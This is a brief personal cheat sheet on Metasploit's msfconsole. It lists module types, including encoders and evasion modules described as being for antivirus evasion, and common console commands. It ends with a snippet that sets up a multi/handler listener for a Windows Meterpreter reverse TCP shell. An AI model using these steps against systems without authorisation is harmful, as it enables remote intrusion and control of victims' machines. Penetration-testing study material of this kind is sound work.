# Metasploit 

This as simple document condensing the usage of the `msfconsole`.



## Modules

Auxiliary: Non-Exploit, like scanning, fuzzing, sniffing and enumeration against services
Encoders: Encoders will allow you to encode the exploit and payload for AV-Evasion
Evasion: Anti-Virus Evasion modules
Exploits: `searchsploit` and `search` for Exploits
NOPs: Used in payload sizing, by keeping them consistent, to cause intended and not unintended side effect when attempting exploitation.
Payload: Single(one contiguous exploiation process), Stagers(Staged process setup connection to MS to receive Stages in ... stages), Stages(sent to the Stager)
Post: Post-Exploitation phase

## Commands

```msfconsole

background		# background a session
				# OR CTRL+Z
check			# check if system is vulnerable(SOME MODULES HAVE THIS)
exploit					# launch the exploit
	-z					# background exploit when run
info	<module-name> 	# display inforamtion about <module-name>
						# -j for json, -d markdown
jobs					# display jobs
	–k					# kill jobID
	
options					# displays options
search					# searches
session	<number>		# switch or refer to a session
sessions				# list all sessions
	-i					# interact with session number
set						# set data for options
setg					# set global data
show		# display parametres: all, encoders, nops, exploits, payloads, auxiliary, post, plugins, info, options 
				# module-specific: missing, advanced, evasion, targets, actions
use 			# select a module
```

## Simple and useful

Start a listener, set payload, configure options, bang head off the keys: E X P L O I T
```msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST $LISTENING-IP
set LPORT $LISTENING-PORT
exploit
```



